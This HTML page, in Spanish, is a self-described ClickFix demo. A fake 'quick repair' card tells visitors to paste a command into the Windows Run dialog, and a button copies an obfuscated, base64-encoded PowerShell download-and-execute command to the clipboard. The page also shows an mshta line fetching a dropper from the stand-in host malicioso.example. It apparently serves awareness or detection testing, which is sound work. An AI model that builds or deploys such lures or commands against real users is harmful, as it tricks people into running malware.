<!doctype html>
<html lang="es">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>ClickFix Demo - Comando ofuscado</title>
    <style>
      body {
        font-family: system-ui, sans-serif;
        margin: 24px;
        background: #0f172a;
        color: #f8fafc;
      }
      .card {
        max-width: 760px;
        background: rgba(15, 23, 42, 0.85);
        border-radius: 16px;
        padding: 20px;
        border: 1px solid #1e293b;
      }
      code {
        display: block;
        margin-top: 12px;
        background: #111827;
        color: #f9fafb;
        padding: 10px 12px;
        border-radius: 10px;
      }
      .cta {
        margin-top: 16px;
        padding: 10px 16px;
        border-radius: 10px;
        border: none;
        background: #ef4444;
        color: #fff;
      }
    </style>
  </head>
  <body>
    <div class="card">
      <h1>Reparación rápida (falsa)</h1>
      <p>
        Abre el <strong>Run dialog</strong> y pega el comando ofuscado para restaurar la red.
      </p>
      <code>po^wershell -NoP -W Hidden -Enc SQBFAFgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwBtAGEAbABpAGMAbwBzAG8ALgBlAHgAYQBtAHAAbABlAC8AbgBlAHQAcAAuAHAAcwAxACkA</code>
      <code>c^md /c start mshta http://malicioso.example/dropper.hta</code>
      <button class="cta" id="copy-obfuscated" type="button">Copiar</button>
    </div>
    <script>
      const payload =
        'po^wershell -NoP -W Hidden -Enc SQBFAFgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwBtAGEAbABpAGMAbwBzAG8ALgBlAHgAYQBtAHAAbABlAC8AbgBlAHQAcAAuAHAAcwAxACkA';
      document.getElementById("copy-obfuscated").addEventListener("click", async () => {
        try {
          await navigator.clipboard.writeText(payload);
        } catch (error) {
          const fallback = document.createElement("textarea");
          fallback.value = payload;
          document.body.appendChild(fallback);
          fallback.select();
          document.execCommand("copy");
          fallback.remove();
        }
      });
    </script>
  </body>
</html>
